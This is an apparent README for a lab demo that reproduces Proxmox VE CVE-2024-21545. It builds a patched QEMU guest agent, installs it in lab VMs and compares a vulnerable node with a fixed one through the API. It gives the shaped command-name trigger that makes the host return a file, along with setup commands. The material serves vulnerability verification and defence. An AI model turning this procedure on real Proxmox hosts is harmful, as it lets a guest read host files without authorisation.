# Proxmox VE CVE-2024-21545 end-to-end demo

This demo compares CVE-2024-21545 in a purpose-built Proxmox VE lab with two
API targets:

- a vulnerable Proxmox VE node;
- a fixed Proxmox VE node or equivalent patched package;
- one controlled VM on each node, running the lab-patched QEMU Guest Agent;
- one low-sensitivity host proof file used to prove host-side read behavior.

The same guest-agent trigger is sent to both nodes. The vulnerable node should
return the proof file from the Proxmox host. The fixed node should return JSON,
an HTTP error, or another non-download response.

Do not run this against systems you do not own or administer.

## Requirements

On the machine running the demo:

```bash
sudo apt install -y python3
```

For building the patched QEMU Guest Agent:

```bash
sudo apt install -y git build-essential pkg-config libglib2.0-dev \
  flex bison libpixman-1-dev
```

## Lab topology

Prepare two disposable Proxmox VE API targets:

```text
vulnerable PVE node -> VM with patched qemu-ga
fixed PVE node      -> VM with patched qemu-ga
```

Create a low-sensitivity proof file on the Proxmox hosts. Use the same path on
both nodes so the comparison is symmetric:

```bash
sudo sh -c 'printf "%s\n" "apiattack-vulnerable-node" > /etc/cve-2024-21545-proof.txt'
```

On the fixed node, use a different string:

```bash
sudo sh -c 'printf "%s\n" "apiattack-fixed-node" > /etc/cve-2024-21545-proof.txt'
```

The default `TARGET_PATH` is `/etc/cve-2024-21545-proof.txt`.

## Build the patched guest agent

The exploit-side guest-agent change is stored as a small patch:

```bash
patches/qemu-ga-cve-2024-21545-download.patch
```

Build it against the pinned QEMU tag:

```bash
cd apiAttack
./run-demo.sh fetch
./run-demo.sh patch
./run-demo.sh build
```

The patched binary is built at:

```text
.lab/qemu-v10.2.1/build/qga/qemu-ga
```

Install that binary only in the disposable lab VMs:

```bash
scp .lab/qemu-v10.2.1/build/qga/qemu-ga root@VM_IP:/tmp/qemu-ga.patched
ssh root@VM_IP 'systemctl stop qemu-guest-agent && \
  install -m 0755 /tmp/qemu-ga.patched /usr/sbin/qemu-ga && \
  systemctl start qemu-guest-agent'
```

Repeat for the VM on the vulnerable node and the VM on the fixed node.

The patch triggers only on a deliberately shaped command name:

```text
NOTFOUND/etc/cve-2024-21545-proof.txt
```

## API credentials

The runner supports either a Proxmox API token or ticket authentication.

Preferred shared token form:

```bash
export PVE_API_TOKEN='lab@pve!apiattack=00000000-0000-0000-0000-000000000000'
```

Ticket authentication fallback:

```bash
export PVE_USERNAME='lab@pve'
export PVE_PASSWORD='replace-with-lab-password'
```

If the two nodes need different credentials, use:

```bash
export VULN_PVE_API_TOKEN='lab@pve!apiattack=...'
export FIXED_PVE_API_TOKEN='lab@pve!apiattack=...'
```

or the per-node username/password variables printed by:

```bash
./run-demo.sh requirements
```

## Run the end-to-end comparison

Set the two API targets:

```bash
export VULN_PVE_URL='https://pve-vulnerable.example:8006'
export VULN_NODE='pve-vulnerable'
export VULN_VMID='100'

export FIXED_PVE_URL='https://pve-fixed.example:8006'
export FIXED_NODE='pve-fixed'
export FIXED_VMID='100'
```

Set the proof path and optional expected content:

```bash
export TARGET_PATH='/etc/cve-2024-21545-proof.txt'
export TARGET_EXPECTED_SUBSTRING='apiattack-vulnerable-node'
```

Most Proxmox labs use self-signed certificates. The runner defaults to insecure
lab TLS mode. To require valid certificates:

```bash
export PVE_INSECURE=0
```

Run:

```bash
./run-demo.sh compare
```

Expected result:

- vulnerable node: `download: yes` and a preview of the proof file;
- fixed node: `download: no`;
- full responses saved under `.lab/output/`.

## Smoke test

The offline model is still useful for checking local runner behavior without a
Proxmox server:

```bash
./run-demo.sh smoke
```

## Cleanup

Local runner state:

```bash
./run-demo.sh cleanup
```

Restore the original guest-agent binary inside each disposable VM if you keep
the VMs after the lab.

## References

- Snyk Labs, "Proxmox VE CVE-2024-21545: Tricking the API":
  https://labs.snyk.io/resources/proxmox-ve-cve-2024-21545-tricking-the-api/
- QEMU source tree:
  https://gitlab.com/qemu-project/qemu
